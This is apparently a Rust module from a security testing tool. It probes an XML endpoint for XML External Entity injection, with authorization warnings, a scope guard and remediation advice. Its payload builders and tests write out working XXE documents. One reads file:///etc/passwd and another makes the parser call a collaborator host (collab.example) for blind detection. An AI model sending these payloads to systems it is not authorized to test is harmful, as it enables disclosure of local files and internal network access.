//! `nullhawk xxe` — test an XML endpoint for XML External Entity injection.
//!
//! An XML parser that resolves external entities will, when it reads a document that
//! declares one, go and fetch whatever the entity points at: a local file, or a URL. Two
//! ways to see it happen:
//!
//!   - **In band** — point the entity at a local file (`file:///etc/passwd`) and reference
//!     it where the document's content is echoed. If the file's contents come back in the
//!     response, the parser read it. Needs no collaborator and proves file disclosure.
//!   - **Out of band** — point the entity at a collaborator URL and reference it. A
//!     callback proves the parser fetched it even when nothing is reflected — the blind
//!     case an in-band test cannot reach. Needs `--server`.
//!
//! This sends an XML body, which is almost always a `POST`, so it is a tool a person runs
//! against an endpoint they are authorized to test — not something the active scan does on
//! its own, which never replays a state-changing request. It asks before sending.
//!
//! The payload is a minimal document with the external entity declared in its DTD; a parser
//! processes the DTD before schema validation, so this often works even against an endpoint
//! that would reject the document's shape. `--root` sets the element name when the endpoint
//! is picky about it.

use std::sync::Arc;
use std::time::Duration;

use nullhawk_engine::guard::ScopeGuard;
use nullhawk_engine::transport::{HttpTransport, Origin, SendOptions};
use nullhawk_http::{TcpTransport, TlsConfig};
use nullhawk_oob::{Collaborator, PayloadMode};
use nullhawk_types::http::{HttpRequest, HttpService};
use nullhawk_types::scope::{Scope, ScopeRule};
use nullhawk_types::{NullhawkError, Result};

pub struct Args<'a> {
    pub url: &'a str,
    /// Collaborator authority for the out-of-band probe. When absent, only the in-band
    /// file-read probe is sent.
    pub server: Option<&'a str>,
    /// The root element name of the crafted document.
    pub root: &'a str,
    /// The local file the in-band probe tries to read.
    pub file: &'a str,
    /// HTTP method (default POST).
    pub method: Option<&'a str>,
    /// Extra headers, `Name: value`.
    pub headers: &'a [String],
    /// Seconds to wait for an out-of-band callback before polling.
    pub wait: u64,
    pub insecure: bool,
    pub yes: bool,
    pub json: bool,
}

pub fn run(args: Args<'_>) -> Result<()> {
    let (service, path) = HttpService::parse_url(args.url)?;
    let method = args.method.unwrap_or("POST").to_string();

    if !args.json {
        println!("XML External Entity (XXE) test");
        println!("  target:       {method} {}", args.url);
        println!("  in-band read: file://{}", args.file);
        match args.server {
            Some(server) => println!("  out-of-band:  via collaborator {server}"),
            None => println!("  out-of-band:  skipped (pass --server to enable the blind probe)"),
        }
        println!();
        println!(
            "This sends an XML body (usually a state-changing {method}). Only test an endpoint \
             you are authorized to, and that you are willing to have receive this request."
        );
        if !args.yes && !crate::proxy::confirm("Send the XXE probes?")? {
            println!("Nothing was sent.");
            return Ok(());
        }
    }
    if args.json && !args.yes {
        return Err(NullhawkError::invalid_input(
            "--yes",
            "an XXE test sends traffic, and --json cannot ask; pass --yes to confirm",
        ));
    }

    let scope = Scope::new().include(ScopeRule::host(service.host.clone()));
    let transport = if args.insecure {
        TcpTransport::with_tls(TlsConfig::accept_any())
    } else {
        TcpTransport::new()
    };
    let guard = ScopeGuard::new(transport, Arc::new(scope));
    let options = SendOptions::automated(Origin::Scanner);
    let extra = parse_headers(args.headers)?;

    let build = |body: String| {
        let mut request = HttpRequest::get(service.clone(), path.clone());
        request.method = method.clone();
        request.headers.set("Content-Type", "application/xml");
        for (name, value) in &extra {
            request.headers.set(name, value.clone());
        }
        // The transport does not frame the body for us; a server reads only as many bytes
        // as Content-Length names, so without it the XML body arrives empty.
        request
            .headers
            .set("Content-Length", body.len().to_string());
        request.body = bytes::Bytes::from(body);
        request
    };

    let result = runtime()?.block_on(async {
        // In-band: read a local file and look for its contents in the response.
        let in_band = match guard
            .send(build(file_payload(args.root, args.file)), options.clone())
            .await
        {
            Ok(exchange) => {
                let body = String::from_utf8_lossy(&exchange.response.body).into_owned();
                looks_like_file_disclosure(&body).then_some(excerpt(&body))
            }
            Err(_) => None,
        };

        // Out-of-band: a collaborator callback proves a blind XXE.
        let mut oob = Vec::new();
        if let Some(server) = args.server {
            let collaborator = Collaborator::new(server, PayloadMode::Path);
            let (token, payload) = collaborator.mint();
            let _ = guard
                .send(build(oob_payload(args.root, &payload)), options.clone())
                .await;
            tokio::time::sleep(Duration::from_secs(args.wait)).await;
            oob = collaborator.poll(&token).await.unwrap_or_default();
        }

        (in_band, oob)
    });

    let (in_band, oob) = result;
    report(&args, in_band, &oob);
    Ok(())
}

fn report(args: &Args<'_>, in_band: Option<String>, oob: &[nullhawk_oob::Interaction]) {
    if args.json {
        let payload = serde_json::json!({
            "target": args.url,
            "in_band_file_read": in_band.is_some(),
            "in_band_excerpt": in_band,
            "out_of_band": !oob.is_empty(),
            "interactions": oob,
        });
        println!("{payload}");
        return;
    }

    println!();
    let mut confirmed = false;
    if let Some(excerpt) = &in_band {
        confirmed = true;
        println!("XXE CONFIRMED — in-band file read:");
        println!(
            "  the response to a document whose external entity pointed at file://{} contained",
            args.file
        );
        println!("  what that file looks like:");
        println!("    {excerpt}");
    }
    if !oob.is_empty() {
        confirmed = true;
        println!("XXE CONFIRMED — out-of-band callback:");
        for interaction in oob {
            println!(
                "    {} {} {} from {} at {}",
                interaction.protocol.to_uppercase(),
                interaction.method,
                interaction.path,
                interaction.source,
                interaction.at,
            );
        }
        println!("  the parser fetched the external entity's URL — a blind XXE.");
    }

    if confirmed {
        println!();
        println!("The XML parser resolves external entities. That is XXE: it can read local");
        println!("files and reach internal services. Disable external-entity and DTD processing");
        println!("in the parser (the fix is one configuration flag in most libraries).");
    } else {
        println!("No XXE confirmed. The in-band read showed no file contents");
        if args.server.is_some() {
            println!("and no out-of-band callback arrived within {}s.", args.wait);
        } else {
            println!("(no --server was given, so the blind out-of-band case was not tested).");
        }
        println!("That is bounded by what was tried, not proof the parser is safe.");
    }
}

/// A minimal XML document whose external entity reads a local file and is referenced where
/// the content is echoed.
fn file_payload(root: &str, file: &str) -> String {
    format!(
        "<?xml version=\"1.0\"?>\n<!DOCTYPE {root} [<!ENTITY xxe SYSTEM \"file://{file}\">]>\n<{root}>&xxe;</{root}>"
    )
}

/// The same, but the entity points at a URL — a callback to it proves a blind XXE.
fn oob_payload(root: &str, url: &str) -> String {
    format!(
        "<?xml version=\"1.0\"?>\n<!DOCTYPE {root} [<!ENTITY xxe SYSTEM \"{url}\">]>\n<{root}>&xxe;</{root}>"
    )
}

/// Whether a response body looks like the contents of a system file a `file://` entity
/// would have read. Conservative: the shapes of `/etc/passwd` and Windows `win.ini`, not a
/// guess that any changed response is a disclosure.
fn looks_like_file_disclosure(body: &str) -> bool {
    let unix_passwd =
        body.contains("root:") && (body.contains(":0:0:") || body.contains(":/root:"));
    let win_ini = {
        let lower = body.to_ascii_lowercase();
        lower.contains("[extensions]") || lower.contains("for 16-bit app support")
    };
    unix_passwd || win_ini
}

/// A short, single-line excerpt of a disclosed file for the report.
fn excerpt(body: &str) -> String {
    let line = body
        .lines()
        .find(|l| l.contains("root:") || l.to_ascii_lowercase().contains("[extensions]"))
        .unwrap_or_else(|| body.lines().next().unwrap_or(""));
    let trimmed = line.trim();
    if trimmed.chars().count() > 80 {
        format!("{}…", trimmed.chars().take(80).collect::<String>())
    } else {
        trimmed.to_string()
    }
}

/// Parses `Name: value` header arguments.
fn parse_headers(headers: &[String]) -> Result<Vec<(String, String)>> {
    headers
        .iter()
        .map(|header| {
            header
                .split_once(':')
                .map(|(name, value)| (name.trim().to_string(), value.trim().to_string()))
                .ok_or_else(|| {
                    NullhawkError::invalid_input(
                        "header",
                        format!("expected 'Name: value', got {header:?}"),
                    )
                })
        })
        .collect()
}

fn runtime() -> Result<tokio::runtime::Runtime> {
    tokio::runtime::Runtime::new()
        .map_err(|e| NullhawkError::Internal(format!("failed to start the async runtime: {e}")))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_file_payload_declares_and_references_an_external_entity() {
        let p = file_payload("data", "/etc/passwd");
        assert!(p.contains("<!DOCTYPE data ["), "{p}");
        assert!(
            p.contains(r#"<!ENTITY xxe SYSTEM "file:///etc/passwd">"#),
            "{p}"
        );
        assert!(p.contains("<data>&xxe;</data>"), "{p}");
    }

    #[test]
    fn the_oob_payload_points_the_entity_at_the_collaborator() {
        let p = oob_payload("r", "http://collab.example/tok");
        assert!(
            p.contains(r#"<!ENTITY xxe SYSTEM "http://collab.example/tok">"#),
            "{p}"
        );
        assert!(p.contains("<r>&xxe;</r>"), "{p}");
    }

    #[test]
    fn file_disclosure_recognises_passwd_and_win_ini_not_ordinary_responses() {
        assert!(looks_like_file_disclosure(
            "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:"
        ));
        assert!(looks_like_file_disclosure(
            "; for 16-bit app support\n[extensions]"
        ));
        // An ordinary XML or HTML response is not a disclosure.
        assert!(!looks_like_file_disclosure("<data>ok</data>"));
        assert!(!looks_like_file_disclosure(
            "<html><body>root cause analysis</body></html>"
        ));
    }

    #[test]
    fn an_excerpt_is_one_trimmed_line() {
        let got = excerpt("  <xml>\nroot:x:0:0:root:/root:/bin/bash\n</xml>");
        assert_eq!(got, "root:x:0:0:root:/root:/bin/bash");
    }
}
